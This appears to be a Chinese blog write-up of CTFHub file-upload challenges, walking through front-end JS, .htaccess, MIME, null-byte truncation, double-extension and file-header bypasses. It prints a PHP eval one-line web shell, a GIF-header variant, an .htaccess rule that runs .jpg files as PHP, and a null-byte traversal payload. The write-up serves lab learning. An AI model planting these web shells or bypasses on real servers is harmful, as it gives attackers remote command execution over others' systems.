---
title: Write up CTFHUB web之文件上传
date: 2025-08-27 23:41:22
tags:
    - CTF
    - Web安全
    - Writeup
    - ctfhub
    - 文件上传
categories:
    - CTF
    - Web
    - Writeup
---

# 前言

文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服端命令的能力。想要完成这一攻击，需要满足几个条件：
1. 上传的文件能够被 WEB 容器执行
2. 用户能从 WEB 上访问这个文件
3. 文件在上传后，主要的内容不能发生改变

这两天在 CTFHUB 做了几道文件上传的题，包括 js 绕过、.htaccess 上传绕过、文件头绕过等等，感觉还是蛮有意思的。

![image.png](https://s2.loli.net/2025/08/27/ZuermW41HjLKC2A.png)

# 工具准备

## 蚁剑

我们利用文件上传漏洞的目的是获得执行服务器端命令的能力，在 CTF 中，这类题的 flag 通常放在服务器的某个目录下，我们获得服务端命令后，即可遍历服务器的目录找到 flag 。

我们当然可以在服务器执行 ls、cd、 find、cat 等命令查找、打开文件，但是有一些工具能让我们更方便地查看文件，而蚁剑就是这么一款开源的跨平台网站管理工具，方便我们进行一些常规操作。

项目地址：https://github.com/AntSwordProject/antSword

![image.png](https://s2.loli.net/2025/08/27/bYJLWy1sUdexH7X.png)

## Burp Suite

网站通常会对上传的文件做一些校验，比如校验文件名扩展名、MIME、文件头等，有一些校验是可以通过修改伪造请求数据绕过的，这就要用到 Burp Suite 了。

Burp Suite是一个用于攻击web应用程序的集成化的渗透测试工具，它集合了多种渗透测试组件，能够使我们更好的完成对web应用的渗透测试和攻击。我们经常会用 Burp Suite 来做爆破、抓包、改包等操作。

工具链接：https://portswigger.net/burp

# 做题

## 无验证

先来一道简单点的题，这道题没有对文件进行任何校验，正好借此来熟悉一下怎么通过上传的脚本文件获取到服务器的命令执行能力。

![image.png](https://s2.loli.net/2025/08/28/xT4ejOtXFpqR2SC.png)

先来写个很简单的**一句话木马**的php文件，原来就是 eval() 函数会把语句内的字符串当作 PHP 代码来执行来执行，我们通过 post 请求的 cmd 参数来输入命令，很简单吧！

```
<?php @eval($_POST['cmd']); ?>
```

直接上传木马文件，可以看到网站很贴心地给我们返回了文件的相对路径。

![image.png](https://s2.loli.net/2025/08/28/CD4uSVXvdcH93wJ.png)

先试试能不能执行命令吧！构造一个 POST 请求，测试一下 ls、pwd 命令

![image.png](https://s2.loli.net/2025/08/28/pyZvWFkedbomVqi.png)

![image.png](https://s2.loli.net/2025/08/28/zkcOTmqZ5P1EFuj.png)

确认木马文件上传并访问成功后，打开蚁剑，Add shell，Shell url 就是当前的链接 + 木马文件相对路径，而 Shell pwd 则是 post 参数 cmd，然后 Test Connection 看到测试连接成功后，直接 Add 就行。

![image.png](https://s2.loli.net/2025/08/28/xk9pGcQAqLEOTiV.png)

接下来就可以连上服务器随意浏览服务器的文件了！实际上蚁剑就是帮我们省去了自己构造注入了命令的 POST 请求的功夫，替换成了图形界面。

![image.png](https://s2.loli.net/2025/08/28/xZwmBAMUsSqyojY.png)

找到 flag，通过！

![image.png](https://s2.loli.net/2025/08/28/uNlROwzfIT369KW.png)

![image.png](https://s2.loli.net/2025/08/28/JO7vpmStW8u9yKN.png)

## js 验证

这次直接上传文件被拦截了。

![1.png](https://s2.loli.net/2025/08/28/m7cEgqZVTAKS2hn.png)

查看网页代码可以看到，拦截的逻辑是在前端做的。

![2.png](https://s2.loli.net/2025/08/28/JaKFp7ebd9h4jDM.png)

想要绕过前端 js 的验证，通常有几种方法：
1. 禁用 js。这个很容易理解，直接在浏览器设置禁用 js，这个校验的程序就跑不了了
2. 删除检测代码。前端一般给 form 表单添加 onsubmit 监听（或者其它事件），直接在浏览器删除掉这个代码就是了
3. 拦截请求，改包。上传一个符合 js 验证条件的文件，然后抓包，再修改请求数据，再放行请求

前两种办法比较简单，不过多赘述，我这里使用第三种方法。

首先把刚才的 muma.php 文件重命名为 muma.jpg 文件，上传文件，拦截请求把 filename 修改回 muma.php 即可。上传成功后该怎么做，你懂的……

![3.png](https://s2.loli.net/2025/08/28/wM5cSeI4RTOYNpZ.png)

## .htaccess

> .htaccess 文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

> .htaccess 文件（或者“分布式配置文件”）提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。

> 但是需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。


这次查看代码可以看到一段注释的 php 代码，这其实是后端的代码，放在这里给我们用作提示。可以看到后缀名为脚本的文件都被禁止上传了，由于这是后端的校验，因此我们无法通过改包等方式来绕过了。

![2.png](https://s2.loli.net/2025/08/28/PEJBa7ufUwlby5S.png)

但是可以看到黑名单中并没有 .htaccess 文件，那我们可以尝试通过 .htaccess 配置把后缀名不在黑名单中的文件，按照 php 文件去解析，这样就能达到目的。

首先新建一个 .htaccess 文件，内容如下：

```
AddType application/x-httpd-php .jpg  # 将后缀名为.jpg、且内容符合PHP语法规范的文件当成PHP文件解析

```

直接上传 .htaccess 文件，可以看到上传成功了。

![4.png](https://s2.loli.net/2025/08/28/p6SO8wXgkRPQMJq.png)

此时把一句话木马文件 muma.php 重命名为 muma.jpg，上传后用蚁剑连接可以看到连接成功了！

![7.png](https://s2.loli.net/2025/08/28/IlMm3DoPpXexSEj.png)

## MIME 绕过

> MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。

MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。
有些程序不是校验文件后缀名，而是校验请求头里的 Content-Type，这里面会声明消息内容类型，这题就是如此。

![1.png](https://s2.loli.net/2025/08/28/3tId4MlrSfKF1QN.png)

上传 muma.php，用 Burp Suite 把 Content-Type 里的 application/x-php 修改为 image/jpeg 即可绕过校验。

![2.png](https://s2.loli.net/2025/08/28/it4sWB15YITMzAa.png)

![3.png](https://s2.loli.net/2025/08/28/6jV1QwibqyNBGuX.png)

## 00 截断

这道题给出了后端的校验代码，这次不仅只接受后缀名为 jpg、png、gif 的文件，还会拿我们请求的 **GET 参数 + 随机数 + 时间 + 上传文件的后缀名** 作为保存在服务器中的文件名。

由于这次设置了白名单，我们无法上传 .htaccess 文件，并且存储后的文件名有一定的随机性，我们即使能绕过白名单校验，也需要想办法获取到上传后的文件名才能访问……

![2.png](https://s2.loli.net/2025/08/28/y8TI41nd76BuJgO.png)

这个时候就要尝试一下 00 截断了。

早期 php（≤ 5.3.3）在把字符串传给底层 C API（文件系统、fopen/include/stat 等）时，没有阻断 NUL 字节。C API 把 \0 当作字符串结尾，导致 **\0 后面的内容被悄悄截掉** ，于是出现了“00 截断”。

比如后端代码为：

```
include($_GET['file'] . '.php');
```

我们传入的参数为：

```
?file=../../uploads/shell.jpg%00
```

触发流程：%00 → 解码成 \x00 → 传入底层时路径变成 ../../uploads/shell.jpg（.php 被截掉）

利用这一漏洞，这道题我们可以：
1. 给 $_GET['road'] 传入 muma.php%00。这样即可截断后面字符串，达到上传后的文件名可控的目的。
2. 上传前的文件名改为 muma.php%00.jpg。这样在校验后缀名时，程序会认为这是一个 .jpg 文件；而在保存及移动文件时，则会认为这是一个 .php 文件。

上传 muma.php，在抓包时，修改 road 参数、filename、Content-Type。这次上传后没有回显文件相对地址，但是看到默认的 road 参数为 /var/www/html/upload，我们也可以猜到，当前上传的页面其实位于服务器的 /var/www/html 目录，而上传后的目录则为 /var/www/html/upload。

![3.png](https://s2.loli.net/2025/08/28/YzWoyH938dNufOx.png)

请求一下文件，可以看到请求没报错，后面的步骤就不过多赘述了。

![4.png](https://s2.loli.net/2025/08/28/FIzQv8K9xNTa75q.png)

## 双写后缀

这次查看提示的后端代码可以看到，后端是直接把黑名单中的后缀名替换成空字符串，而且是只替换一次……所以直接用双写后缀即可，上传 muma.phpphp，它会自动把文件名修改为 muma.php。

![2.png](https://s2.loli.net/2025/08/28/pnwz4OxrkP3Vgob.png)

## 文件头检查

这道题没有给出后端代码，只能先测试测试。

上传 muma.php，提示只能上传一些图片类型的文件。

![2.png](https://s2.loli.net/2025/08/28/pnwz4OxrkP3Vgob.png)

修改后缀名为 .jpg ，提示“文件错误”，这个时候应该就能猜出来后端校验了文件内容，发现文件内容并不是图片。

![1.png](https://s2.loli.net/2025/08/28/rOBWwRcmaE6QpoN.png)

校验的方法一般都是只会读取文件的前几个字节，确保文件内容和扩展名匹配。
所以可以尝试添加或修改文件头来通过校验，我这里添加 gif 动态图的文件头，最终 php 文件的内容如下：

```
GIF89a
<?php @eval($_POST['cmd']); ?>
```

![3.png](https://s2.loli.net/2025/08/28/D8A9HhBvE5bUwjJ.png)

上传时再修改一下 Content-Type，使其与文件头对应的 MIME 类型保持一致。

![4.png](https://s2.loli.net/2025/08/28/muI4sNWdhLBEZFc.png)

上传成功！

![7.png](https://s2.loli.net/2025/08/28/DwGxEn2TH5NVyWr.png)

这道题还能用图片马来绕过，原理其实和伪造文件头类似，可以了解下。

> 图片马：在正常的图片文件里插入一句话木马代码

# 总结

文件上传的绕过方式一般有以下几种：
1. 前端绕过。如果是前端 JS 校验或 HTML 标签限制，通过禁用 JS、删除 HTML 事件、抓包改包等方式可以轻松绕过。
2. 扩展名绕过。常见的绕过方式有双扩展名、大小写绕过、00 截断（仅旧版本 PHP）、特殊后缀（依赖解析器）等方式。
3. MIME 类型绕过。服务器只检查 Content-Type，直接抓包改包即可。
4. 文件头检查绕过。有些题会用 finfo / getimagesize 检查文件头是否是图片，可以通过**伪造文件头**、**图片马**绕过。
5. .htaccess 绕过。通过 .htaccess 修改解析规则，让原本不能执行的文件变成可执行脚本。

口诀

> 前端假，扩展乱，MIME 改，头部串；
> 黑名单，大小写，00 截断走后端；
> 路径穿，条件竞，解压包里藏木马。